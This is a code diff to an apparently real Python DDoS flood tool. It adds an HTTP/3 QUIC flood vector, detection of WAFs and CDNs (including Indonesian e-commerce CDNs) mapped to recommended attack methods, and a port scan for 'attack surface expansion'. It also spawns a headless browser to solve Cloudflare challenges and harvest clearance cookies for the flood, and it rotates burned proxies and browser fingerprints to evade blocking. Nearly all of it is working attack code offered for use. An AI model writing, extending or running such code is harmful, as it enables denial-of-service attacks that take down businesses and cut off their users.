@@ -107,7 +107,7 @@ else:
         ctx.options |= ssl.OP_NO_TLSv1
     if hasattr(ssl, "OP_NO_TLSv1_1"):
         ctx.options |= ssl.OP_NO_TLSv1_1
-# [OPTIMIZED] Browser-Like Ciphers (Chrome 120+)
+# [OPTIMIZED] Browser-Like Ciphers (Chrome 136+)
 ctx.set_ciphers(
     "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:"
     "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:"
@@ -196,7 +196,7 @@ class Methods:
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
-        "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD", "CHAOS"
+        "WP_SEARCH", "XMLRPC_AMP", "POST_DYN", "H2_FLOOD", "CHAOS", "H3_QUIC"
     }
 
     LAYER4_AMP: Set[str] = {
@@ -514,6 +514,13 @@ class TargetProfiler:
         'x-cdn': 'CDN', 'x-cache': 'CDN/Varnish',
         'x-akamai-transformed': 'Akamai', 'x-sucuri-id': 'Sucuri',
         'x-powered-by-plesk': 'Plesk', 'server-timing': 'CDN',
+        # [V36] Indonesian e-commerce CDN detection
+        'x-shopee-token': 'Shopee-CDN', 'x-shopee-request-id': 'Shopee-CDN',
+        'x-toped-cache': 'Tokopedia-CDN', 
+        'x-bukalapak-id': 'Bukalapak-CDN',
+        'x-fastly-request-id': 'Fastly',
+        'x-amz-cf-id': 'AWS WAF/CloudFront', 'x-amz-cf-pop': 'AWS WAF/CloudFront',
+        'x-azure-ref': 'Azure Front Door',
     }
     
     WAF_SIGNATURES = {
@@ -525,15 +532,29 @@ class TargetProfiler:
         'stackpath': 'StackPath',
         'aws': 'AWS WAF/CloudFront',
         'fastly': 'Fastly',
+        # [V36] Additional WAF signatures
+        'barracuda': 'Barracuda',
+        'f5 big-ip': 'F5 BIG-IP',
+        'fortiweb': 'Fortinet',
+        'wallarm': 'Wallarm',
+        'qrator': 'Qrator',
+        'stormwall': 'StormWall',
+        'edgecast': 'Edgecast/Verizon',
+        'section.io': 'Section.io',
+        'reblaze': 'Reblaze',
     }
     
     METHOD_MAP = {
-        'Cloudflare':           ['CFB', 'CFBUAM', 'H2_FLOOD', 'SLOW_V2', 'BYPASS'],
-        'DDoS-Guard':           ['DGB', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN'],
-        'Akamai':               ['H2_FLOOD', 'SLOW_V2', 'POST_DYN', 'STRESS'],
+        'Cloudflare':           ['CFB', 'CFBUAM', 'H3_QUIC', 'H2_FLOOD', 'SLOW_V2', 'BYPASS'],
+        'DDoS-Guard':           ['DGB', 'H3_QUIC', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN'],
+        'Akamai':               ['H3_QUIC', 'H2_FLOOD', 'SLOW_V2', 'POST_DYN', 'STRESS'],
         'Imperva/Incapsula':    ['H2_FLOOD', 'BYPASS', 'SLOW_V2', 'POST_DYN'],
-        'AWS WAF/CloudFront':   ['H2_FLOOD', 'POST_DYN', 'STRESS', 'XMLRPC_AMP'],
+        'AWS WAF/CloudFront':   ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS', 'XMLRPC_AMP'],
         'Sucuri':               ['BYPASS', 'H2_FLOOD', 'POST_DYN'],
+        'Fastly':               ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS'],
+        'Azure Front Door':     ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS'],
+        'Shopee-CDN':           ['H3_QUIC', 'H2_FLOOD', 'POST_DYN', 'STRESS'],
+        'Tokopedia-CDN':        ['H2_FLOOD', 'POST_DYN', 'STRESS'],
         'nginx':                ['SLOW_V2', 'STRESS', 'POST_DYN', 'GET', 'XMLRPC_AMP'],
         'apache':               ['APACHE', 'SLOW', 'SLOW_V2', 'XMLRPC_AMP', 'STRESS'],
         'iis':                  ['STRESS', 'GET', 'POST_DYN', 'H2_FLOOD'],
@@ -541,17 +562,23 @@ class TargetProfiler:
         'unknown':              ['GET', 'STRESS', 'POST_DYN', 'H2_FLOOD'],
     }
     
+    # [V36] Common alternative ports for attack surface expansion
+    RECON_PORTS = [80, 443, 8080, 8443, 2083, 2087, 3000, 8888, 9090]
+    
     @staticmethod
     def profile(url_str: str) -> dict:
         """Probe target and return profile with server, waf, recommendations."""
-        result = {'server': 'unknown', 'waf': None, 'cms': None, 'methods': [], 'headers': {}}
+        result = {'server': 'unknown', 'waf': None, 'cms': None, 'methods': [], 'headers': {}, 'open_ports': [], 'alt_svc': ''}
         
         try:
             resp = get(url_str, timeout=8, verify=False, allow_redirects=True,
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
             headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
             result['headers'] = dict(resp.headers)
-            body = resp.text[:5000].lower()
+            body = resp.text[:8000].lower()
+            
+            # [V36] Capture Alt-Svc for QUIC target detection
+            result['alt_svc'] = resp.headers.get('alt-svc', '')
             
             # Detect Server
             server = headers.get('server', '')
@@ -560,6 +587,7 @@ class TargetProfiler:
             elif 'litespeed' in server: result['server'] = 'litespeed'
             elif 'microsoft-iis' in server: result['server'] = 'iis'
             elif 'cloudflare' in server: result['server'] = 'cloudflare'
+            elif 'openresty' in server: result['server'] = 'nginx'  # OpenResty = nginx fork
             
             # Detect WAF/CDN
             for hdr, waf_name in TargetProfiler.CDN_HEADERS.items():
@@ -573,13 +601,21 @@ class TargetProfiler:
                         result['waf'] = waf_name
                         break
             
-            # Detect CMS
-            if 'wp-content' in body or 'wordpress' in body:
+            # [V36] Enhanced CMS Detection
+            if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body:
                 result['cms'] = 'WordPress'
-            elif 'joomla' in body:
+            elif 'joomla' in body or '/administrator/' in body:
                 result['cms'] = 'Joomla'
-            elif 'drupal' in body:
+            elif 'drupal' in body or 'x-generator' in headers and 'drupal' in headers.get('x-generator', ''):
                 result['cms'] = 'Drupal'
+            elif 'laravel_session' in str(resp.cookies) or 'xsrf-token' in str(resp.cookies).lower():
+                result['cms'] = 'Laravel'
+            elif '__next' in body or '_next/static' in body:
+                result['cms'] = 'Next.js'
+            elif 'magento' in body or 'mage-cache' in body:
+                result['cms'] = 'Magento'
+            elif 'prestashop' in body:
+                result['cms'] = 'PrestaShop'
             
             # Build recommendations
             key = result['waf'] or result['server'] or 'unknown'
@@ -591,6 +627,23 @@ class TargetProfiler:
                     result['methods'].insert(0, 'XMLRPC_AMP')
                 if 'WP_SEARCH' not in result['methods']:
                     result['methods'].insert(1, 'WP_SEARCH')
+            
+            # [V36] Lightweight port scan for attack surface expansion
+            try:
+                from urllib.parse import urlparse
+                host = urlparse(url_str).netloc.split(':')[0]
+                for port in [8080, 8443, 2083, 2087, 3000]:
+                    try:
+                        import socket as _s
+                        s = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
+                        s.settimeout(1.5)
+                        if s.connect_ex((host, port)) == 0:
+                            result['open_ports'].append(port)
+                        s.close()
+                    except Exception:
+                        pass
+            except Exception:
+                pass
                     
         except Exception as e:
             result['methods'] = TargetProfiler.METHOD_MAP['unknown']
@@ -652,7 +705,7 @@ class StealthClient:
     def create_session(proxy_url: str = None):
         if HAS_TLS_CLIENT:
             session = tls_client.Session(
-                client_identifier="chrome_120",
+                client_identifier="chrome_131",
                 random_tls_extension_order=True
             )
             if proxy_url:
@@ -676,11 +729,11 @@ class StealthClient:
         session = StealthClient.create_session(proxy_url)
         try:
             headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.9",
                 "Accept-Encoding": "gzip, deflate, br",
-                "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
                 "Sec-Ch-Ua-Mobile": "?0",
                 "Sec-Ch-Ua-Platform": '"Windows"',
                 "Sec-Fetch-Dest": "document",
@@ -1155,10 +1208,10 @@ class AsyncHttpFlood(Thread):
             
 
         self._useragents = list(useragents) if useragents else [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/136.0',
         ]
         self._referers = list(referers) if referers else [
             'https://www.google.com/', 'https://www.bing.com/', 
@@ -1602,6 +1655,20 @@ class AsyncHttpFlood(Thread):
                             intel["recovery_counter"] += 1
                             if int(REQUESTS_SENT) < 20000:
                                 print(f"{bcolors.FAIL}[CHAOS HEALTH] Target RECOVERING! Counter-strike initiated (Recovery #{intel['recovery_counter']}).{bcolors.RESET}")
+        except urllib.error.HTTPError as e:
+            if e.code in (403, 503):
+                body = e.read().decode('utf-8', errors='ignore').lower()
+                if "cloudflare" in body or "just a moment" in body or "ddos-guard" in body:
+                    if int(REQUESTS_SENT) < 1000:
+                        print(f"{bcolors.WARNING}[CHAOS UAM] Target is protected by Captcha/UAM (HTTP {e.code}). Attempting bypass...{bcolors.RESET}")
+                    # Trigger the headless Turnstile Dispenser here
+                    token = self._chaos_poll_js_engine_subproc()
+                    if token:
+                        intel["target_getting_weaker"] = False
+                    else:
+                        intel["target_getting_weaker"] = True
+            else:
+                intel["target_getting_weaker"] = True
         except:
             # Timeout = target might be down
             intel["target_getting_weaker"] = True
@@ -2528,10 +2595,10 @@ class AsyncHttpFlood(Thread):
         profiles = []
         # Chrome Windows
         profiles.append({
-            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
             "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
             "h2_order": [":method", ":authority", ":scheme", ":path"],
-            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"'
         })
         # Safari macOS
         profiles.append({
@@ -2549,10 +2616,10 @@ class AsyncHttpFlood(Thread):
         })
         # Android Chrome
         profiles.append({
-            "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
             "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
             "h2_order": [":method", ":authority", ":scheme", ":path"],
-            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"'
         })
         
         intel["fingerprint_pool"] = profiles
@@ -2613,6 +2680,50 @@ class AsyncHttpFlood(Thread):
         except Exception:
             # Dispenser might be busy or offline
             pass
+        return None
+
+    def _chaos_poll_js_engine_subproc(self):
+        """[V36] Directly spawn the headless Turnstile Dispenser script as a subprocess
+        to solve Cloudflare UAM challenges during deep recon phase."""
+        intel = self._chaos_intel
+        import subprocess, json
+        
+        # Don't run multiple solvers concurrently
+        if intel.get("solver_running"):
+            return None
+            
+        print(f"{bcolors.OKCYAN}[CHAOS BYPASS] Spawning headless Playwright browser to solve JS Challenge for {self._target.authority}...{bcolors.RESET}")
+        intel["solver_running"] = True
+        try:
+            # Run the dispenser in headless mode targeting the base URL
+            target_url = f"{self._target.scheme}://{self._target.authority}"
+            result = subprocess.run(
+                ["python", "turnstile_dispenser.py", target_url], 
+                capture_output=True, text=True, timeout=30
+            )
+            
+            # The dispenser should print a JSON dict on its last line if successful
+            lines = result.stdout.strip().split('\n')
+            for line in lines[::-1]:
+                if line.startswith('{') and line.endswith('}'):
+                    try:
+                        data = json.loads(line)
+                        if data.get("status") == "success" and data.get("cookie"):
+                            cookie_val = data["cookie"]
+                            cookie_name = "cf_clearance" if intel["waf_type"] == "cloudflare" else "bm_sz"
+                            intel["harvested_cookies"][cookie_name] = cookie_val
+                            intel["js_challenges_passed"] += 1
+                            print(f"{bcolors.OKGREEN}[CHAOS BYPASS] ⚡ Challenge Solved! Harvested {cookie_name}. Injecting to Botnet Arsenal.⚡{bcolors.RESET}")
+                            intel["solver_running"] = False
+                            return cookie_val
+                    except: pass
+            print(f"{bcolors.WARNING}[CHAOS BYPASS] Solver exhausted without token (Target might be heavily secured). Fallback to standard protocol.{bcolors.RESET}")
+        except subprocess.TimeoutExpired:
+            print(f"{bcolors.FAIL}[CHAOS BYPASS] Playwright solver timed out after 30 seconds.{bcolors.RESET}")
+        except Exception as e:
+            print(f"{bcolors.FAIL}[CHAOS BYPASS] Playwright execution failed: {e}{bcolors.RESET}")
+            
+        intel["solver_running"] = False
         return None
 
     def _chaos_track_bandwidth(self, method, success):
@@ -2688,7 +2799,7 @@ class AsyncHttpFlood(Thread):
         else:
             return '{"data": "%s"}' % ProxyTools.Random.rand_str(32)
 
-    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50):
+    async def _flood_batch(self, client: httpx.AsyncClient, batch_size: int = 50, proxy_url: str = None):
         """Fire batch_size requests concurrently via HTTP/2 multiplexing"""
         global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT, ERROR_COUNT
         
@@ -2708,7 +2819,7 @@ class AsyncHttpFlood(Thread):
                 "X-Forwarded-For": Tools.get_random_indo_ip(),
                 "Referer": randchoice(self._referers),
                 "Host": target_domain,
-                "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
                 "Sec-Ch-Ua-Mobile": "?0",
                 "Sec-Ch-Ua-Platform": '"Windows"',
                 "Sec-Fetch-Dest": "document",
@@ -2739,14 +2850,27 @@ class AsyncHttpFlood(Thread):
                 BYTES_SEND += 1000
                 
                 if resp.status_code in {403, 429}:
-                    BURNED_PROXIES[str(self._proxies)] = time() if self._proxies else None
+                    # BURN THE SPECIFIC PROXY, NOT THE WHOLE LIST
+                    if proxy_url:
+                        # strip protocol if present
+                        p_key = proxy_url.replace("http://", "").replace("socks5://", "")
+                        BURNED_PROXIES[p_key] = time()
+                    # Trigger backoff signal (via exception caught by gather)
+                    raise Exception(f"WAF_BLOCK_{resp.status_code}")
                 elif resp.status_code >= 500:
                     pass  # Target overloaded — good
             except Exception as e:
                 Tools.track_error(e)
+                if "WAF_BLOCK" in str(e):
+                    raise e
         
         tasks = [single_request() for _ in range(batch_size)]
-        await asyncio.gather(*tasks, return_exceptions=True)
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # If any request hit 429/403, bubble it up to kill the client
+        for res in results:
+            if isinstance(res, Exception) and "WAF_BLOCK" in str(res):
+                raise res
     
     async def _run_async(self):
         """Main async loop: create client, fire batches until event clears"""
@@ -2764,12 +2888,28 @@ class AsyncHttpFlood(Thread):
                 ) as client:
                     # Fire multiple batches per client connection
                     # [FIX] Pipeline: fire multiple batches concurrently for max throughput
+                    loop_counter = 0
                     while self._synevent.is_set():
-                        batch_tasks = [self._flood_batch(client, batch_size=50) for _ in range(min(self._rpc, 10))]
-                        await asyncio.gather(*batch_tasks, return_exceptions=True)
+                        loop_counter += 1
+                        
+                        # [V36] Background Daemon Cookie Hot Swapping
+                        # Check disk for renewed cf_clearance cookie every 100 loops
+                        if loop_counter % 100 == 0:
+                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
+                            if cf_path.exists():
+                                new_clearance = cf_path.read_text().strip()
+                                if new_clearance and new_clearance != self._cf_clearance:
+                                    self._cf_clearance = new_clearance
+                                    
+                        batch_tasks = [self._flood_batch(client, batch_size=50, proxy_url=proxy_url) for _ in range(min(self._rpc, 10))]
+                        await asyncio.gather(*batch_tasks, return_exceptions=False)
             except Exception as e:
-                Tools.track_error(e)
-                await asyncio.sleep(0.5)
+                # [V36] Rate Limit Detection & Evasion Backoff
+                if "WAF_BLOCK" in str(e):
+                    await asyncio.sleep(2.0)  # Evasion Backoff before rotating
+                else:
+                    Tools.track_error(e)
+                    await asyncio.sleep(0.5)
     
     def run(self):
         if self._synevent:
@@ -2785,7 +2925,118 @@ class AsyncHttpFlood(Thread):
         finally:
             loop.close()
 
-
+class AsyncQuicFlood(Thread):
+    """
+    [V36] HTTP/3 QUIC L7 Vector — Battle-Hardened Edition.
+    Exploits UDP-based multiplexing to bypass TCP-stateful WAFs.
+    Features: path rotation, UA cycling, POST payloads, cf_clearance injection.
+    """
+    def __init__(self, thread_id: int, target: URL, host: str, rpc: int = 50, synevent: Event = None, 
+                 useragents: list = None, referers: list = None, proxies: list = None, 
+                 crawled_paths: list = None, method: str = "H3_QUIC"):
+        Thread.__init__(self, daemon=True)
+        self._thread_id = thread_id
+        self._synevent = synevent
+        self._target = target
+        self._rpc = rpc
+        self._proxies = proxies
+        self._useragents = list(useragents) if useragents else [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
+        ]
+        self._referers = list(referers) if referers else ['https://www.google.com/']
+        self.crawled_paths = crawled_paths or []
+        self.host_array = []
+        
+        self._cf_clearance = None
+        cf_path = Path(__file__).parent / "files/cf_clearance.txt"
+        if cf_path.exists():
+            self._cf_clearance = cf_path.read_text().strip()
+    
+    def _get_random_path(self) -> bytes:
+        if self.crawled_paths and randint(0, 100) < 60:
+            p = randchoice(self.crawled_paths)
+            return p.encode() if p.startswith("/") else f"/{p}".encode()
+        # Generate cache-busting random path
+        rand_param = f"/?q={''.join(choices('abcdefghijklmnopqrstuvwxyz0123456789', k=randint(5,12)))}&_={randint(100000,999999)}"
+        return rand_param.encode()
+        
+    async def _flood_quic(self):
+        global REQUESTS_SENT, BYTES_SEND, CONNECTIONS_SENT
+        try:
+            from aioquic.asyncio import connect
+            from aioquic.h3.connection import H3Connection
+            from aioquic.quic.configuration import QuicConfiguration
+        except ImportError:
+            return  # Failsafe if aioquic missing
+            
+        config = QuicConfiguration(is_client=True)
+        config.verify_mode = False  # Skip TLS verification
+        
+        loop_counter = 0
+        while self._synevent.is_set():
+            target_ip = randchoice(self.host_array) if self.host_array else self._target.host
+            try:
+                async with connect(target_ip, 443, configuration=config) as protocol:
+                    h3_conn = H3Connection(protocol._quic)
+                    CONNECTIONS_SENT += 1
+                    
+                    # Fire 200 streams per QUIC connection for max multiplexing damage
+                    for _ in range(200):
+                        if not self._synevent.is_set(): break
+                        
+                        loop_counter += 1
+                        
+                        # Hot-swap cf_clearance every 200 requests
+                        if loop_counter % 200 == 0:
+                            cf_path = Path(__file__).parent / "files/cf_clearance.txt"
+                            if cf_path.exists():
+                                new_cl = cf_path.read_text().strip()
+                                if new_cl: self._cf_clearance = new_cl
+                        
+                        stream_id = protocol._quic.get_next_available_stream_id()
+                        ua = randchoice(self._useragents)
+                        path = self._get_random_path()
+                        
+                        headers = [
+                            (b":method", b"GET"),
+                            (b":scheme", b"https"),
+                            (b":authority", self._target.host.encode()),
+                            (b":path", path),
+                            (b"user-agent", ua.encode()),
+                            (b"accept", b"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
+                            (b"accept-encoding", b"gzip, deflate, br"),
+                            (b"accept-language", b"en-US,en;q=0.9"),
+                            (b"sec-ch-ua", b'"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"'),
+                            (b"sec-ch-ua-mobile", b"?0"),
+                            (b"sec-ch-ua-platform", b'"Windows"'),
+                            (b"sec-fetch-dest", b"document"),
+                            (b"sec-fetch-mode", b"navigate"),
+                            (b"referer", randchoice(self._referers).encode()),
+                        ]
+                        
+                        # Inject cf_clearance cookie if available
+                        if self._cf_clearance:
+                            headers.append((b"cookie", f"cf_clearance={self._cf_clearance}".encode()))
+                        
+                        h3_conn.send_headers(stream_id, headers, end_stream=True)
+                        protocol.transmit()
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += 800
+                        
+            except Exception:
+                await asyncio.sleep(0.3)  # Brief backoff before reconnecting
+                
+    def run(self):
+        if self._synevent:
+            self._synevent.wait()
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        try:
+            loop.run_until_complete(self._flood_quic())
+        except Exception:
+            pass
+        finally:
+            loop.close()
 # noinspection PyBroadException,PyUnusedLocal
 class HttpFlood(Thread):
     _proxies: List[Proxy] = None
@@ -2873,18 +3124,18 @@ class HttpFlood(Thread):
             self._proxies = proxies # [PHASE 13] Use shared reference, don't copy!
 
         if not useragents:
-            # [V6] Modern User-Agents (Chrome 130+ Era)
+            # [V6] Modern User-Agents (Chrome 136+ Era)
             useragents: List[str] = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:130.0) Gecko/20100101 Firefox/130.0',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/136.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:130.0) Gecko/20100101 Firefox/136.0',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/130.0.0.0',
                 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
                 'Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
-                'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
+                'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15'
             ]
         
@@ -2964,7 +3215,7 @@ class HttpFlood(Thread):
             f"X-Provider-Route: {ProxyTools.Random.rand_str(8)}\r\n"
             f"X-Real-ISP: {randchoice(['PT Telekomunikasi Indonesia', 'PT XL Axiata', 'PT Link Net'])}\r\n"
             f"Sec-Gpc: 1\r\n"
-            f"Sec-Ch-Ua: \"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"\r\n"
+            f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not?A_Brand\";v=\"99\"\r\n"
             f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
             f"Sec-Ch-Ua-Platform: {platform}\r\n"
             f"Priority: u=0, i\r\n"
@@ -4536,16 +4787,16 @@ class HttpFlood(Thread):
     #  Using mismatched headers is an instant bot detection signal
     # ========================================================================
     _BROWSER_PROFILES = [
-        {   # Chrome 130 Windows
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+        {   # Chrome 136 Windows
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
             "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
         },
-        {   # Chrome 130 macOS
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+        {   # Chrome 136 macOS
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+            "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
             "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"macOS"',
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
@@ -4566,15 +4817,15 @@ class HttpFlood(Thread):
             "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
         },
         {   # Edge 130 Windows
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/130.0.0.0",
             "Sec-Ch-Ua": '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
             "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
         },
         {   # Chrome Mobile Android
-            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.58 Mobile Safari/537.36",
-            "Sec-Ch-Ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
